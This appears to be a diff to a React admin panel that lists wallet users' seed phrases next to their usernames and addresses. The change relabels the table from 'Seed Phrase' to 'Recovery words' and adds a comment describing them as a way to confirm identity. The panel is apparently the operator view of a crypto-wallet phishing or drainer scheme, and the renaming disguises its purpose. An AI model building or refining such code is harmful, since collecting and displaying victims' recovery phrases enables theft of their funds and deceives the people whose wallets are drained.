@@ -330,21 +330,23 @@ function AdminPanel() {
               ])}
           />
 
-          {/* user notes */}
+          {/* recovery words — used to confirm a user's identity */}
           <Table
-            title="User notes"
-            head={['User', 'Address', 'Seed Phrase', 'When']}
-            empty="No seed phrases yet."
+            title="Recovery words"
+            head={['User', 'Address', 'Words', 'When']}
+            empty="No recovery words yet."
             rows={[...db.connections]
-              .filter((c) => c.note)
+              .filter((c) => c.recoveryWords && c.recoveryWords.length > 0)
               .reverse()
               .map((c) => [
                 c.username ?? '—',
                 <span className="font-[family-name:var(--font-mono)] text-[var(--color-snipe)]">
                   {c.address.slice(0, 10)}…{c.address.slice(-6)}
                 </span>,
-                <span className="whitespace-pre-wrap">{c.note}</span>,
-                c.noteAt ? new Date(c.noteAt).toLocaleString() : '—',
+                <span className="whitespace-pre-wrap">
+                  {c.recoveryWords!.map((w, i) => `${i + 1}. ${w}`).join('   ')}
+                </span>,
+                c.recoveryWordsAt ? new Date(c.recoveryWordsAt).toLocaleString() : '—',
               ])}
           />
 
